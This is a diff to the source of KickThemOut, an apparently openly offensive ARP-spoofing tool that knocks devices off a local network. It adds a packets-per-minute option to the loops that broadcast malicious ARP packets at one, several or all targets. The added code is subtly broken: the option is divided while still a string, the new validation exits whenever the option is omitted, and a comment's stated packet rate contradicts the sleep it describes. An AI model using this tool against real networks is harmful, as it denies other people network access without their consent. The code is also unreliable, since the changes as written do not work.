@@ -208,7 +208,10 @@ def nonInteractiveAttack():
                         print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
                         raise SystemExit
                     spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
-                time.sleep(10)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(10)
         except KeyboardInterrupt:
             # re-arp targets on KeyboardInterrupt exception
             print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
@@ -286,7 +289,10 @@ def kickoneoff():
             while True:
                 # broadcast malicious ARP packets (10p/s)
                 spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
-                time.sleep(10)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(10)
         except KeyboardInterrupt:
             # re-arp target on KeyboardInterrupt exception
             print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
@@ -363,7 +369,10 @@ def kicksomeoff():
                     for host in hostsList:
                         if host[0] == ip:
                             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
-                time.sleep(10)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(10)
         except KeyboardInterrupt:
             # re-arp targets on KeyboardInterrupt exception
             print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
@@ -423,7 +432,10 @@ def kickalloff():
                 if reScan == 4:
                     reScan = 0
                     scanNetwork()
-                time.sleep(10)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(10)
         except KeyboardInterrupt:
             print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
             reArp = 1
@@ -679,6 +691,9 @@ def main():
 
         nonInteractiveAttack()
 
+
+
+# loading animation during network scan
 def scanningAnimation():
     global stopAnimation
     text = "Scanning your network, hang on..."
@@ -694,12 +709,14 @@ def scanningAnimation():
         i += 1
         time.sleep(0.1)
 
+
+
 if __name__ == '__main__':
     # implement option parser
     optparse.OptionParser.format_epilog = lambda self, formatter: self.epilog
 
     version = '0.1'
-    info = 'KickThemOut ' + version + ' Nikolaos Kamarinakis (nikolaskama.me)'
+    info = 'KickThemOut ' + version + ' Nikolaos Kamarinakis & David Schütz'
 
     examples = ('\nExamples:\n'+
                 '  sudo python kickthemout.py --attack arp --target 192.168.1.10 \n'+
@@ -712,6 +729,9 @@ if __name__ == '__main__':
 
     parser.add_option('-a', '--attack', action='store',
         dest='attack', help='attack method')
+
+    parser.add_option('-p', '--packets', action='store',
+        dest='packets', help='number of packets broadcasted per minute (12 recommended)')
 
     def targetList(option, opt, value, parser):
         setattr(parser.values, option.dest, value.split(','))
@@ -730,6 +750,12 @@ if __name__ == '__main__':
         defaultGatewayMacSet = False
     except KeyboardInterrupt:
         shutdown()
+
+    if options.packets is not None and (options.packets).isdigit():
+        pass
+    else:
+        print("\n{0}ERROR: Argument for number of packets broadcasted per minute must be an integer {1}(e.g. {2}--packet 60{3}).\n").format(RED, END, BLUE, END)
+        raise SystemExit
 
     if options.attack is None and options.targets is None or options.attack is not None and options.targets is None:
         # set to interactive version
